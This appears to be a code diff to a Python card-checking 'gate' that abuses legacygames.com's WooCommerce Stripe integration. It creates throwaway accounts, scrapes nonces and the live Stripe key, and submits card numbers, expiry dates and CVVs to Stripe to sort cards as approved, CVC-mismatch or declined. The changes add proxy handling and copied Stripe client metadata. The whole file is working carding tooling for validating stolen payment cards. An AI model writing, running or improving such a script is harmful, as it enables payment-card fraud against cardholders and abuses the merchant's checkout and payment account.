@@ -14,16 +14,18 @@ user_locks = {}
 
 
 class PayflowGate:
-    """Payflow Stripe Auth Gate - Real Checking"""
+    """Payflow Stripe Auth Gate using legacygames.com - Real Checking (Original API)"""
     
     def __init__(self, proxy=None):
         self.s = requests.Session()
+        self.proxy = proxy
+        
+        # Headers from original API
         self.headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
         }
         self.s.headers.update(self.headers)
-        self.proxy = proxy
         
         # Apply proxy if provided
         if proxy:
@@ -33,37 +35,38 @@ class PayflowGate:
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
     
     def check_card(self, cc, mm, yy, cvv):
-        """Full Payflow Auth check"""
+        """Full Payflow Auth check - Original API from legacygames.com"""
         try:
-            # Format month
-            if int(mm) < 10 and len(mm) == 1:
+            # Format month - exact as original
+            if int(mm) < 10 and '0' not in mm:
                 mm = f'0{mm}'
             
-            # Format year
+            # Format year - exact as original
             if len(yy) == 2:
                 yy = f'20{yy}'
             
-            # Step 1: Get registration page and extract nonce
+            # Step 1: Get registration page - exact as original
             html_response = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30)
             
             reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html_response.text)
             if not reg_match:
-                return "Declined ❌", "Failed to get registration nonce"
+                return "Declined ❌", "Nonce Error"
             reg = reg_match.group(1)
             
             pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', html_response.text)
             if not pk_live_match:
-                return "Declined ❌", "Failed to get pk_live"
+                return "Declined ❌", "PK Error"
             pk_live = pk_live_match.group(0)
             
-            # Step 2: Register user
-            user = f"user{random.randint(1000, 9999)}{self.rnd_str(5)}"
+            # Step 2: Register user - exact as original
+            start_num = random.randint(1, 9999)
+            user = f"user{random.randint(1000, 9999)}{start_num}"
             email = f"{user}@gmail.com"
             
             data = {
                 'username': user,
                 'email': email,
-                'password': 'SecurePass123!@#',
+                'password': 'qeqweqweqwqw12312@',
                 'promo_referral_name': '',
                 'wc_order_attribution_source_type': 'typein',
                 'wc_order_attribution_referrer': '(none)',
@@ -88,27 +91,28 @@ class PayflowGate:
             
             self.s.post('https://legacygames.com/my-account/', data=data, timeout=30)
             
-            # Step 3: Get add payment nonce
+            # Step 3: Get add payment nonce - exact as original
             html2 = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30).text
             
             addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html2)
             if not addnonce_match:
-                return "Declined ❌", "Failed to get payment nonce"
+                return "Declined ❌", "Nonce Error"
             addnonce = addnonce_match.group(1)
             
-            # Step 4: Create Stripe payment method (NO PROXY for Stripe API)
-            stripe_session = requests.Session()
-            data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2F3eb96675be%3B+stripe-js-v3%2F3eb96675be%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=13706&key={pk_live}'
+            # Step 4: Create Stripe payment method - exact data format as original (NO PROXY)
+            data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TR&payment_user_agent=stripe.js%2F3eb96675be%3B+stripe-js-v3%2F3eb96675be%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=13706&client_attribution_metadata[client_session_id]=758e76a9-5fda-4c8f-ab58-3d338b594899&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=49ba8458-1fd3-4bde-b85d-30d98c7cef9a&guid=aa7c8346-057c-4871-b817-d2082e3842d790f3af&muid=915ccdf6-9a1e-4b46-b7bf-84213dd8f2e84af545&sid=a2210aa1-6aaf-4e1d-b733-a78f5af25f8605fd5c&key={pk_live}'
             
+            # Stripe API call without proxy
+            stripe_session = requests.Session()
             response_stripe = stripe_session.post('https://api.stripe.com/v1/payment_methods', headers=self.headers, data=data_stripe, timeout=30)
             
             try:
                 pm = response_stripe.json()['id']
             except (KeyError, ValueError):
-                error_msg = response_stripe.json().get('error', {}).get('message', 'Unknown Stripe Error')
-                return "Declined ❌", error_msg[:50]
+                error_msg = response_stripe.json().get('error', {}).get('message', 'Stripe Error')
+                return "Declined ❌", error_msg[:40]
             
-            # Step 5: Confirm setup intent
+            # Step 5: Confirm setup intent - exact as original
             data_setup_intent = {
                 'action': 'wc_stripe_create_and_confirm_setup_intent',
                 'wc-stripe-payment-method': pm,
@@ -119,39 +123,32 @@ class PayflowGate:
             response_final = self.s.post('https://legacygames.com/wp-admin/admin-ajax.php', data=data_setup_intent, timeout=30)
             res = response_final.text
             
-            # Parse response
+            # Parse response - exact logic as original
             if '"success":true' in res or '"success":True' in res:
                 return "Approved ✅", "Card Approved"
             elif 'succeded' in res:
                 return "Approved ✅", "Card Approved"
             elif '"success":false' in res or '"success":False' in res:
-                if "expiration year is invalid" in res.lower():
+                if "Your card's expiration year is invalid." in res:
                     return "Declined ❌", "Expired Card"
-                elif "expiration month is invalid" in res.lower():
+                elif "Your card's expiration month is invalid." in res:
                     return "Declined ❌", "Expired Card"
-                elif "card number is incorrect" in res.lower():
+                elif 'Your card number is incorrect.' in res:
                     return "Declined ❌", "Incorrect Number"
-                elif "security code is incorrect" in res.lower():
-                    return "CCN ✅", "CVC Mismatch"
-                elif "card was declined" in res.lower():
+                elif "Your card's security code is incorrect." in res:
+                    return "CCN ✅", "Incorrect CVC"
+                elif 'Your card was declined.' in res:
                     return "Declined ❌", "Card Declined"
-                elif "insufficient funds" in res.lower():
+                elif 'insufficient funds' in res.lower():
                     return "Approved ✅", "Insufficient Funds"
-                elif "do not honor" in res.lower():
+                elif 'do not honor' in res.lower():
                     return "Approved ✅", "Do Not Honor"
-                elif "pickup card" in res.lower():
-                    return "Approved ✅", "Pickup Card"
-                elif "lost card" in res.lower():
-                    return "Approved ✅", "Lost Card"
-                elif "stolen card" in res.lower():
-                    return "Approved ✅", "Stolen Card"
-                elif "generic decline" in res.lower():
-                    return "Declined ❌", "Generic Decline"
                 else:
+                    # Extract error message
                     try:
                         resp_json = response_final.json()
-                        msg = resp_json.get('data', {}).get('error', {}).get('message', 'Unknown')
-                        return "Declined ❌", msg[:50]
+                        msg = resp_json.get('data', {}).get('error', {}).get('message', 'Declined')
+                        return "Declined ❌", msg[:40]
                     except:
                         return "Declined ❌", "Unknown Error"
             else:
